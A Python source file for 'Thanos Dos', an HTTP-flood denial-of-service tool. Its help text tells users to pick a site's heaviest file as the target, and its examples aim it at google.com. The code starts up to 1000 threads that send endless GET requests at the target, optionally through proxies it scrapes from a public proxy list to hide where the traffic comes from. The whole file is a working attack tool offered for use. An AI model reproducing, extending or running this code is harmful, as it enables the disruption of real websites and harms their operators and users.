#!/usr/local/bin/python3
#coding: utf-8

import requests
from colorama import Fore, init
import json
import time
import sys
import threading
import os
import platform
from ping3 import ping, verbose_ping
import random

oss = platform.system()
if "Windows" in oss:
  os.system("cls")
else:
  os.system("clear")
os.system(f"title Thanos Dos By loTus01")

help = """
 COMMAND
 -------
    python dos_hamer.py [url] [thread] [proxies]

    url = https://website.com/bigfile.txt
    thread = 1 - 1000
    proxies = no/yes/scrap
    scrap = scrap proxies and use them

 USAGE
 -----
    This Dos Tool will send a bunch of http-get request to a web server
    Usage:
        Use the inspect element (Crt + Shift + i) on the website and find the heaviest file. It can have any extension (.txt, .png, .exe ...)
        Use only http-type proxies without authorization
        Do not put too much thread, because your wifi will also lag
        If your using proxies, make shure to put them in http_proxies.txt in ./proxies

 EXAMPLES
 --------
    root@root> python dos_hamer.py https://www.google.com/images/nav_logo299.webp 500 no
    --> This will send requests to google.com and won't use proxies

    root@root> python dos_hamer.py https://www.google.com/images/nav_logo299.webp 500 scrap
    --> This will send requests to google.com and scrapt for http proxies online and use them
"""


banner = f"""\033[36m
            )             )     )   (     
   *   )  ( /(   (      ( /(  ( /(   )\ )  
 ` )  /(  )\())  )\     )\()) )\()) (()/(  
  ( )(_))((_)\((((_)(  ((_)\ ((_)\   /(_)) 
 \033[36m(\033[35m_\033[36m(\033[35m_\033[36m())  \033[35m_\033[36m((\033[35m_\033[36m))\ \033[35m_\033[36m )\  \033[35m_\033[36m((\033[35m_\033[36m)  ((\033[35m_\033[36m) (\033[35m_\033[36m))\033[35m   
 |_   _| | || |\033[36m(_)\033[35m_\\\033[36m(_)\033[35m| \| | / _ \ / __|
   | |   | __ | / _ \  | .` || (_) |\__ \ \033[34m  
   |_|   |_||_|/_/ \_\ |_|\_| \___/ |___/\33[97m
  
{Fore.YELLOW} [!] By loTus01, [\33[4mhttps://github.com/loTus04\033[0m{Fore.YELLOW}]{Fore.RESET}
  """

def scrap(so):

    # setup directorys
    THIS_FOLDER = os.path.dirname(os.path.abspath(__file__))
    proxies_path = fr"""{THIS_FOLDER}\proxies\http_proxies.txt"""
    
    if so == "scrap":
        link = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        proxies_D = requests.get(link, allow_redirects=True)
        open(proxies_path, 'wb').write(proxies_D.content)
    else:
        pass

    proxies_str = ""
    with open(proxies_path, "r") as file:
        Lines = file.readlines() 
        for line in Lines:
            proxy = line.strip()
            proxies_str = proxies_str + proxy + ","
    proxies_list = list(proxies_str.split(","))

    if so == "scrap":
        os.remove(proxies_path)
    else:
        pass
    return proxies_list


def dos(url, proxies, i, resp):
    while True:
        if proxies == True:

            proxy = random.choice(resp)

            proxies_L = {
                "http": proxy,
                "https": proxy,
                }
            try:
                url_domaine = url.split("/")
                url_domaine2 = url_domaine[2]
                ping1 = ping(url_domaine2)
                ping2 = round(ping1, 3)
                
                r = requests.get(url, proxies=proxies_L)

                if r.status_code == 200:
                    print(f"{Fore.GREEN} [+] Snaped {url_domaine2}, Proxy: {proxy} Thead: {i}, Response: {r.status_code}, Ping: {ping2}s")
                elif r.status_code == 429:
                    print(f"{Fore.YELLOW} [+] Snaped {url_domaine2}, Thead: {i}, Response: {r.status_code}, Ping: {ping2}s")
                else:
                    print(f"{Fore.RED} [+] Snaped {url_domaine2}, Thead: {i}, Response: {r.status_code}, Ping: {ping2}s")
            except:
                print(f"{Fore.RED} [-] BAD PROXY...")



        else:
            try:
                
                url_domaine = url.split("/")
                url_domaine2 = url_domaine[2]
                ping1 = ping(url_domaine2)
                ping2 = round(ping1, 3)

                r = requests.get(url)

                if r.status_code == 200:
                    print(f"{Fore.GREEN} [+] Snaped {url_domaine2}, Thead: {i}, Response: {r.status_code}, Ping: {ping2}s")
                elif r.status_code == 429:
                    print(f"{Fore.YELLOW} [+] Snaped {url_domaine2}, Thead: {i}, Response: {r.status_code}, Ping: {ping2}s")
                else:
                    print(f"{Fore.RED} [+] Snaped {url_domaine2}, Thead: {i}, Response: {r.status_code}, Ping: {ping2}s")
            except:
                print(f"{Fore.RED} [-] ERROR...")


def lunch_thr(thr, url, proxies, resp):
    print(f"{Fore.RED} Creating Threads...{Fore.RESET}")
    time.sleep(0.5)
    i = 1
    for i in range(thr):
        print(f"{Fore.RESET} [+] thread {i} Done !")
        doss = threading.Thread(target=dos, args=(url, proxies, i, resp))
        doss.start()
    print(f"\n{Fore.RED} Starting Threads...{Fore.RESET}")
    time.sleep(0.5)

def main(argu):

    url = argu[1]
    thr = argu[2]
    thr = int(thr)
    opt_p = argu[3]

    if opt_p == "yes":
        proxies = True
        so = "nop"
        resp = scrap(so)
    elif opt_p == "scrap":
        proxies = True
        so = "scrap"
        resp = scrap(so)
    else:
        proxies = False
        resp = ""
    global banner
    print(banner)

    url_domaine = url.split("/")
    url_domaine2 = url_domaine[2]
    os.system(f"""title Thanos Dos By loTus01 / Proxies: {proxies} / Threads: {thr} / Target: {url_domaine2}""")
    lunch_thr(thr, url, proxies, resp)


# test if arg fail
argu = list(sys.argv)
lent = len(sys.argv)
if lent < 2:
    print(banner)
    print(help)
else:
    main(argu)
